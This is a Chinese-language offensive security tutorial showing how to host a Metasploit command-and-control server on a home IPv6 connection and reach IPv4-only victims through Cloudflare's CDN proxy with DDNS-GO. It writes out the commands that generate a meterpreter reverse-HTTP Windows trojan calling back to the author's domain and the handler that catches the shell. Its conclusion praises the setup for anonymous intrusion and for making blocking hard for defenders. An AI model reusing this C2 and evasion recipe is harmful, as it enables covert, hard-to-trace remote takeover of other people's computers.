

# 无公网 IPv4 云主机上线对方电脑

从理论角度来看，利用家用设备的 IPv6 地址来建立 C2 服务器也是可行的。但是企业内网当中基本上是不可能有公网 IPv6 地址的，没有 IPv6 的话就无法访问到我们的 C2 服务器，这也是本文核心要展开说的地方，话不多说，直接看下文吧。

# [](#%E5%89%8D%E8%A8%80%E4%BB%8B%E7%BB%8D "前言介绍")前言介绍

我国也正在积极推广普及 IPv6 技术，个人家庭光猫基本上都是支持 IPv6 的，IPv6 我们可以理解为一个公网 IP，由于 IPv6 资源数量非常庞大，足够保障我们的家庭每个设备都有自己的公网 IPv6 地址，这一切预示着万物互联的时代即将到来，从理论角度来看，利用家用设备的 IPv6 地址来建立 C2 服务器也是可行的。

但是企业内网当中基本上是不可能有公网 IPv6 地址的，没有 IPv6 的话就无法访问到我们的 C2 服务器，这也是本文核心要展开说的地方，话不多说，直接看下文吧。

# [](#%E6%96%B9%E6%A1%88%E8%8D%89%E5%9B%BE "方案草图")方案草图

整体方案实现其实不难，最主要的就是下面两个知识点：

1.  IPv6 DDNS 解析到指定域名
2.  借助 Coudflare 内部的 CDN 代理将 IPv6 流量转到 IPv4

[![](assets/1699406651-f584af3d1a41d4cc3df4f8fae98a5ffc.png)](https://image.3001.net/images/20231106/1699247563_654875cbaf07acb7bbf61.png)

# [](#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C "准备工作")准备工作

总的来说就是下面两个步骤即可：

1.  安装好带 IPv6 地址的 Ubuntu 一台
2.  接入好 Cloudflare 的域名一个

## [](#%E6%A3%80%E6%9F%A5-IPv6-%E7%BD%91%E7%BB%9C "检查 IPv6 网络")检查 IPv6 网络

准备一个没有公网 IPv4 地址，但是存在公网 IPv6 地址的 Ubuntu 系统一个，正常家用的主机基本上是满足上述要求的：

[![](assets/1699406651-66a3d21c144f997e94d7059d023857ed.png)](https://image.3001.net/images/20231106/1699253060_65488b441b347b9b0d327.png)

## [](#%E5%AE%89%E8%A3%85-Metasploit "安装 Metasploit")安装 Metasploit

MSF 是经典的 C2 工具，其他的 C2 工具基本上线原理仿造一下即可，我们先来手动来安装一下 Metasploit：

```tools
bash
```

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

[![](assets/1699406651-a69a9960c2656c283aa7260e906d4c62.png)](https://image.3001.net/images/20231106/1699253514_65488d0a361e70937ac73.png)

## [](#%E5%88%9B%E5%BB%BA-CF-%E7%9A%84-API-%E4%BB%A4%E7%89%8C "创建 CF 的 API 令牌")创建 CF 的 API 令牌

为了保持权限最小化原则，我们这里只[创建](https://dash.cloudflare.com/profile/api-tokens)一个修改 itermux 域名的 DNS 权限 API 令牌：

[![](assets/1699406651-386c33092b3a2884a4b42ee5824e0657.png)](https://image.3001.net/images/20231106/1699254505_654890e9e881f7c3d4299.png)

## [](#%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2-DDNS-GO "安装部署 DDNS-GO")安装部署 DDNS-GO

DDNS-GO 的官方项目地址为：[https://github.com/jeessy2/ddns-go](https://github.com/jeessy2/ddns-go)

DDNS-GO 的作用是将公网地址解析到各大云厂商的域名上。下载好 DDNS-GO 参考官方文档安装一下即可：

```tools
bash
```

```bash
sudo ./ddns-go -s install
```

接着访问服务器的 9876 端口即可打开 DDNS-GO 的配置页面，首先填写我们的 CF 的 API Token：

[![](assets/1699406651-4d40307e7b5e16d03d196c3f87e4ec71.png)](https://image.3001.net/images/20231106/1699254319_6548902f4a30b72f5f479.png)

最后配置一下要 IPv6 对应解析的域名即可：

[![](assets/1699406651-9552d698985c2b28a092ae71d7cb78e6.png)](https://image.3001.net/images/20231106/1699254387_65489073c1a5cbb90826f.png)

通过 DDNS-GO 的日志可以看到 msf.itermux.com 域名成功解析到了我们的公网 IPv6 地址：

[![](assets/1699406651-3815ee72a24bead98fc9c4721819280c.png)](https://image.3001.net/images/20231106/1699254577_654891312f29201ebb142.png)

## [](#%E9%85%8D%E7%BD%AE-Cloudflare "配置 Cloudflare")配置 Cloudflare

因为当前默认域名解析的是 IPv6 地址，IPv4 设备是无法访问到我们的域名的，为此我们需要手动开启 CF 的代理，借助 CF 将域名转换成 IPv4 也可以访问的 IP 地址：

[![](assets/1699406651-95bd745aafec12ba0a512e2d9b40017f.png)](https://image.3001.net/images/20231106/1699255320_654894180b4404bf0957e.png)

然后手动关闭一下 CF 的 SSL 加密：

[![](assets/1699406651-bcbdd390f1811288aa8221f8ca5820dc.png)](https://image.3001.net/images/20231106/1699255540_654894f4c8c059a212f79.png)

## [](#%E9%AA%8C%E8%AF%81%E8%BF%9E%E9%80%9A%E6%80%A7 "验证连通性")验证连通性

首先在服务器上借助 Python3 监听一个 IPv6 的 80 端口：

```tools
bash
```

```bash
python3 -m http.server 80 --bind ::
```

然后直接访问我们的 msf.itermux.com 域名测试成功访问：

[![](assets/1699406651-f68c12470a966c39c6cc3af51600876b.png)](https://image.3001.net/images/20231106/1699255986_654896b2d95e3087989ff.png)

# [](#%E6%93%8D%E4%BD%9C%E7%BB%86%E8%8A%82 "操作细节")操作细节

既然上述操作跑通的话，那么下面直接来尝试一下 MSF 上线吧。后续的操作就比较简单常规了，我们很快的来过一下：

## [](#%E7%94%9F%E6%88%90-Payload "生成 Payload")生成 Payload

我们使用 meterpreter\_reverse\_http 的 Payload，HOST 填写我们的 IPv6 地址 DDNS 的域名 msf.itermux.com，端口就填写 80 端口：

```tools
bash
```

```bash
msf6 > use payload/windows/x64/meterpreter_reverse_http
msf6 > set LHOST msf.itermux.com
msf6 > set LPORT 80
```

[![](assets/1699406651-a3ddd838bca8816b48f8e03d534fec88.png)](https://image.3001.net/images/20231106/1699261365_6548abb5a33e9179c6474.png)

然后直接在 msfconsole 控制台里面使用 generate 生成 Windows exe 木马文件：

```tools
bash
```

```bash
msf6 payload(windows/x64/meterpreter_reverse_http) > generate -f exe -o shell.exe
[*] Writing 208384 bytes to shell.exe...
```

## [](#%E7%9B%91%E5%90%AC%E4%BC%9A%E8%AF%9D "监听会话")监听会话

这里监听的细节是 `set LHOST ::` 表示监听本地的 IPv6 地址：

```tools
bash
```

```bash
msf6 > use exploits/multi/handler
msf6 > set payload windows/x64/meterpreter_reverse_http
msf6 > set LHOST ::
msf6 > set LPORT 80
```

[![](assets/1699406651-ef4e911a3fc54f46ff5607b8fa1f527d.png)](https://image.3001.net/images/20231106/1699261603_6548aca34eea62b2090a0.png)

## [](#%E4%B8%8A%E7%BA%BF%E6%95%88%E6%9E%9C "上线效果")上线效果

运行 shell.exe 后既上线成功，通过 netstat 命令查看，可以看到多个上线的会话连接，这些外连 IP 均为 Cloudflare 的 CDN IP，蓝方防守的话封是封不完，而且不敢封的，因为国内很多大型网站可能也用的是 Cloudflare。

[![](assets/1699406651-bed5a9e2f080474552ea72c6829153a2.png)](https://image.3001.net/images/20231106/1699261909_6548add582b3043cb32b2.png)

MSF 的上线记录效果如下，可以看到 CF 的 CDN IPv6 服务器和本地的 IPv6 交互的记录：

[![](assets/1699406651-f9797b1b55d384a52726c700f9be39ae.png)](https://image.3001.net/images/20231106/1699261958_6548ae068fd6fae8aef90.png)

# [](#%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93 "方案总结")方案总结

1.  以后上线别人的话，不用买云服务器了，连接 SIM 热点或者直接使用家用光猫有 IPv6 地址就行
2.  IPv6 还在普及中，监管方面也比较弱，且 IPv6 也是动态的，很灵活
3.  Cloudflare 的 CDN 外连 IP 蓝方不敢轻易封禁，因为国内很多大厂也用的 Cloudflare 的 CDN
4.  Cloudflare 的 CDN 是多种多样的，封一个两个也封不完的
5.  Cloudflare 的域名接入也不需要实名操作，理论上是可以做到完全匿名的渗透上线的
